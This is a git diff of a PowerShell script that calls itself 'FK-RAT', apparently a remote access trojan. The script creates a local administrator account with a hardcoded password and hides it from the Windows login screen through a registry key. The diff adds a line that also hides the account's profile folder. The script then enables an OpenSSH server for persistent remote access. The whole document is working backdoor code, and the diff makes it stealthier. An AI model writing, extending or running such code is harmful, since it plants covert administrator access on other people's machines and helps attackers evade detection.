@@ -24,7 +24,6 @@ function createAdmin {
 
 function getAdminGroup {
   Get-LocalGroup -sid S-1-5-32-544 | Select-Object Name -OutVariable $group
-
 }
 
 ## Temp Directory
@@ -32,7 +31,7 @@ function getAdminGroup {
 $temp = "$env:temp"
 $dirName = randomText
 
-$uName = "FK-RAT"
+$uName = "fkrat"
 $pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)
 
 $rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
@@ -45,9 +44,10 @@ Set-Location $dirName
 ## Create Admin
 createAdmin -uName $uName -pWord $pWord
 
-## Hide Admin with registry
+## Hide FK-RAT User (Admin)
 New-Item -Path $rPath -Force
 New-ItemProperty -Path $rPath -Name $uName -Value 00000000
+Get-Item "C:\Users\fk-rat" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 
 ## Enable persistent SSH
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
